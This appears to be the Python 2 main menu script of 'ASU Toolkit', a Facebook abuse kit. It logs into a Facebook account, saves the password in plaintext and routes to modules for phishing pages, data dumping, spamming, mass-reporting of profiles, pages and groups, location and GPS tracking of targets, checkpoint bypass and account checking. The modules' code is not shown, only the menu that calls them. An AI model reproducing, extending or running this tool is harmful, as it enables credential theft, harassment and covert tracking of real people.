import os, sys, bs4, json, time, requests,subprocess,main
from data.color import *
from data import banner

def con():
    if os.path.exists('config'):
        pass
    else:
        os.mkdir('config')

def login():
    con()
    req = requests.Session()
    req.headers.update({"User-Agent":"Mozilla/5.0 (Linux; Android 5.1; PICOphone_M4U_M2_M Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36"})
    e = raw_input('[!] No Account Detected\n[*] Login Your Fb\n[?] Username: ')
    p = raw_input('[?] Password: ')
    print '[*] Login ...'
    s = req.post('https://mbasic.facebook.com/login', data={'email': e,
       'pass': p}).url
    if 'save-device' in s or 'm_sess' in s:
        i = json.dumps({'email': e,
           'pass': p,
           'name': bs4.BeautifulSoup(req.get('https://mbasic.facebook.com/me').text, features='html.parser').find('title').text})
        open('config/config.json', 'w').write(i)
        exit('[*] Login Success..\n[!] Run again: python2 ASU.py')

    if 'checkpoint' in s or 'challange' in s:
        exit( '[!] checkpoint challange,your account was locked by facebook,pls open your facebook in browser before you login with asu toolkit\n[!] Run again: python2 ASU.py')
    else:
        exit('[!] Login Failed.\n[!] Run again: python2 ASU.py')

class ASU:
    def __init__(self):
        self.banner()
        self.choice()

    def backk(self):
        raw_input('press enter to menu ...')
        ASU()

    def banner(self):
        print banner._asu_banner()
        print("  %s{%s88%s} Report Bug (WhatsApp) " % (N,G,N))
        print("  %s{%s99%s} Tutorial (Youtube)\n\n" % (N,G,N))

    def choice(self):
        try:
            self.asw = raw_input('%s[%s+%s]%s @deray_> ' % (G, R, G, N)).lower()
        except:
            exit('%s[-]%s User Interrupt.' % (R, N))
        else:
            if self.asw == '':
                return self.choice()
        if self.asw == '1' or self.asw == '01':
            from data import create_server
            create_server.phising()
        else:
            if self.asw == '2' or self.asw == '02':
                from data import dumpper
                dumpper.pilihan()
                self.backk()
            else:
                if self.asw == '3' or self.asw == '03':
                    from data import spammer
                    spammer.main()
                    self.backk()
                else:
                    if self.asw == '4' or self.asw == '04':
                        print '\n\t[ Select Actions ]\n'
                        print '  {%s01%s} Reports Status Target' % (G, N)
                        print '  {%s02%s} Mass Reports Profile' % (G, N)
                        print '  {%s03%s} Page Reports' % (G, N)
                        print '  {%s04%s} Group Reports' % (G, N)
                        print '  {%s05%s} Back To Menu Option' % (R, N)
                        i = raw_input('\n%s[%s+%s] %sActions>> ' % (G, R, G, N))
                        if i == '1' or i == '01':
                            from data import reportContent
                            reportContent.reportContent()
                            self.backk()
                        elif i == '2' or i == '02':
                            from data import reports
                            reports.report()
                            self.backk()
                        elif i == '3' or i == '03':
                            from data import page_report
                            page_report.reportpage()
                            self.backk()
                        elif i == '4' or i == '04':
                            from data import group_report
                            group_report.index()
                            self.backk()
                        elif i == '5' or i == '05':
                            self.backk()
                        else:
                            print '%s[!]%s invalid options!' % (R, N)
                            self.backk()
                    else:
                        if self.asw == '5' or self.asw == '05':
                            from data import auto_addgrup
                            auto_addgrup.grup()
                            self.backk()
                        else:
                            if self.asw == '6' or self.asw == '06':
                                from data import risetPass
                                risetPass.risetPass()
                                self.backk()
                            else:
                                if self.asw == '7' or self.asw == '07':
                                    from data import create_server
                                    create_server.locator()
                                else:
                                    if self.asw == '8' or self.asw == '08':
                                        from data import create_server
                                        create_server.gps()
                                    else:
                                        if self.asw == '9' or self.asw == '09':
                                            from data import checkpoint_detector
                                            checkpoint_detector.bypass()
                                            self.backk()
                                        else:
                                            if self.asw == '10':
                                                print '\t[ Select Actions ]\n'
                                                print '  {%s01%s} Akun Ceker (save to file)' % (G, N)
                                                print '  {%s02%s} Akun Ceker (Just Cek)' % (G, N)
                                                print '  {%s03%s} Group Cheker' % (G, N)
                                                print '  {%s04%s} Back\n' % (R, N)
                                                pk = raw_input('\n%s[%s*%s]%s Actions>> ' % (G, R, G, N))
                                                if pk == '1' or pk == '01':
                                                    from data import checker
                                                    checker.check()
                                                    self.backk()
                                                elif pk == '2' or pk == '02':
                                                    from data import checker
                                                    checker.che()
                                                    self.backk()
                                                elif pk == '3' or pk == '03':
                                                    from data import checker
                                                    checker.index()
                                                    self.backk()
                                                else:
                                                    exit('%s[!]%s Invalid Options.' % (R, N))
                                            else:
                                                if self.asw == '11':
                                                    from data import bot
                                                    bot.bot()
                                                    self.backk()
                                                else:
                                                    if self.asw == '12':
                                                        from data import yahoo_clone
                                                        yahoo_clone.clon()
                                                        self.backk()
                                                    else:
                                                        if self.asw == '13':
                                                            from data import app_check
                                                            app_check.apps()
                                                            self.backk()
                                                        else:
                                                            if self.asw == '14':
                                                                from data import listen
                                                                listen.listen()
                                                            else:
                                                                if self.asw == '15':
                                                                    print '[%s#%s] Updating Asu Toolkit ...' % (G, N)
                                                                    os.system('git pull')
                                                                    print '%s[%s**%s]%s Asu was updated. \xc2\xaf\\_(\xe3\x83\x84)_/\xc2\xaf' % (G, R, G, N)
                                                                else:
                                                                    if self.asw == '16':
                                                                        exit('%s[%s*%s%s]%s Bye \xc2\xaf\\_(\xe3\x83\x84)_/\xc2\xaf' % (C, R, N, C, N))
                                                                    else:
                                                                        if self.asw == 'move':
                                                                            os.remove('config/config.json')
                                                                            os.removedirs('config')
                                                                            login()
                                                                        else:
                                                                            if self.asw == 'banner':
                                                                                ASU()
                                                                            else:
                                                                                if self.asw =="0" or self.asw =="00":
                                                                                    from data import inf
                                                                                    inf.buddy()
                                                                                else:
                                                                                    if self.asw =="17":
                                                                                        from data import reg
                                                                                        reg.reg()
                                                                                    else:
                                                                                        if self.asw =="99":
                                                                                            subprocess.check_output(["am","start","https://youtu.be/bi1X8o_BGsk"])
                                                                                        else:
                                                                                            if self.asw =="88":
                                                                                                subprocess.check_output(["am","start","https://api.whatsapp.com/send?phone=62895353484895"])
                                                                                            else:
                                                                                                print '%s[!]%s Invalid Options!' % (R, N)
                                                                                                self.choice()
